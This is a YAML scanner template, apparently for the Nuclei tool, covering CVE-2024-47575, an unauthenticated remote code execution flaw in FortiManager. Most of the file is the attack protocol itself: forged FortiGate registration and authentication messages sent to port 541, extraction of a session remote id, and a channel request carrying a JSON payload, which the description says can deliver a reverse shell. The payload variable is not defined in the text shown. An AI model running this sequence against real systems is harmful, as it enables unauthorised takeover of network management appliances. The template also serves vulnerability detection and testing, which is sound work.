id: CVE-2024-47575

info:
  name: FortiManager Unauthenticated RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    FortiManager is vulnerable to an unauthenticated remote code execution vulnerability due to improper input sanitization. This script checks for the vulnerability and can exploit it by sending a reverse shell payload.
  reference:
    - https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575
  tags: FORTINET-FortiManager

variables:
  random_id: "{{rand_int(100, 999)}}"

tcp:
  - inputs:
      - data: |
          get ip
          serialno=FGVMEVWG8YMT3R63
          mgmtid=00000000-0000-0000-0000-000000000000
          platform=FortiGate-VM64
          fos_ver=700
          minor=2
          patch=2
          build=1255
          branch=1255
          maxvdom=2
          fg_ip=192.168.1.53
          hostname=FGVMEVWG8YMT3R63
          harddisk=yes
          biover=04000002
          harddisk_size=30720
          logdisk_size=30235
          mgmt_mode=normal
          enc_flags=0
          first_fmgid=
          probe_mode=yes
          vdom=root
          intf=port1
          {{ "\0" | hex_encode }}
      - data: |
          get auth
          serialno=FGVMEVWG8YMT3R63
          mgmtid=00000000-0000-0000-0000-000000000000
          platform=FortiGate-60E
          fos_ver=700
          minor=2
          patch=4
          build=1396
          branch=1396
          maxvdom=2
          fg_ip=192.168.1.53
          hostname=FortiGate
          harddisk=yes
          biover=04000002
          harddisk_size=30720
          logdisk_size=30107
          mgmt_mode=normal
          enc_flags=0
          mgmtip=192.168.1.53
          mgmtport=443
          {{ "\0" | hex_encode }}
      - data: |
          get file_exchange
          localid={{random_id}}
          chan_window_sz=32768
          deflate=gzip
          file_exch_cmd=put_json_cmd
          {{ "\0" | hex_encode }}
    host:
      - "{{Hostname}}"
    port: 541
    read-size: 2048

    extractors:
      - type: regex
        name: remote_id
        part: raw
        regex:
          - "remoteid=([0-9]+)"
        group: 1
        internal: true

    matchers:
      - type: word
        words:
          - "remoteid="
        part: raw

  - inputs:
      - data: |
          channel
          remoteid={{remote_id}}
          {{ "\0" | hex_encode }}
          {{len(json_payload)}}\n
          {{json_payload}}
          0\n
      - data: |
          channel
          action=close
          remoteid={{remote_id}}
          {{ "\0" | hex_encode }}
    host:
      - "{{Hostname}}"
    port: 541
    read-size: 2048

    matchers:
      - type: word
        words:
          - "remoteid="
        part: raw